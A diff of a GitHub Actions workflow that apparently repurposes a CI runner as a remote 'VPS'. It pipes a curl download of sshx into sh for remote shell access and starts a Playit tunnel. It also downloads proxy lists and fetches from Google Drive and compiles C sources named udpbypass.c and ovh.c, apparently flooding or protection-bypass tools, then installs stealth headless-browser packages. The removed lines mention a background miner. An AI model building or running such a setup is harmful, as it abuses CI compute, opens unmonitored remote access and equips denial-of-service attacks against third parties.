@@ -10,26 +10,30 @@ jobs:
     steps:
       - name: ⬇️ Checkout
         uses: actions/checkout@v4
-      - name: 🔧 Start tmate session
+      - name: 🔧 Start SSHX session
         run: |
-          sudo apt update -y && sudo apt install -y tmate
-          tmate -S /tmp/tmate.sock new-session -d
-          tmate -S /tmp/tmate.sock wait tmate-ready
-          SSH=$(tmate -S /tmp/tmate.sock display -p '#{tmate_ssh}')
-          echo "🔗 SSH Connection: $SSH"
-          
+          curl -sSf https://sshx.io/get | sh
+          sshx > sshx_connection.txt 2>&1 &
+          sleep 5
+          echo "🔗 SSHX Connection:"
+          cat sshx_connection.txt
       - name: 🚀 Start Playit Tunnel
         run: |
           wget -q https://github.com/playit-cloud/playit-agent/releases/latest/download/playit-linux-amd64 -O playit
           chmod +x playit
           nohup ./playit > playit.log 2>&1 &
           echo "✅ Playit tunnel started"
-          
       - name: 🔥 Setup VPS Environment
         run: |
-          
-          echo "✅ Miner started in background"
-          
+          wget -q https://raw.githubusercontent.com/SoliSpirit/proxy-list/main/https.txt
+          wget -q https://github.com/ErcinDedeoglu/proxies/raw/refs/heads/main/proxies/https.txt -O proxy.txt
+          pip install gdown
+          gdown 'https://drive.google.com/uc?id=1MuaBraso20I73ixepu6SQWDq0GMnlU05' -O udpbypass.c
+          gcc udpbypass.c -o udpbypass
+          gdown https://drive.google.com/uc?id=1Q2VYSvBdeclp6A1f8xePFrT6Yt7ZB2gX -O ovh.c
+          gcc ovh.c -o ovhbypass
+          npm install cluster colors colorama axios crypto discord.js gradient-string user-agents header-generator hpack socks puppeteer puppeteer-extra puppeteer-extra-plugin-stealth puppeteer-real-browser
+       
       - name: ⏳ Keep VPS alive
         run: |
           for i in $(seq 1 360); do
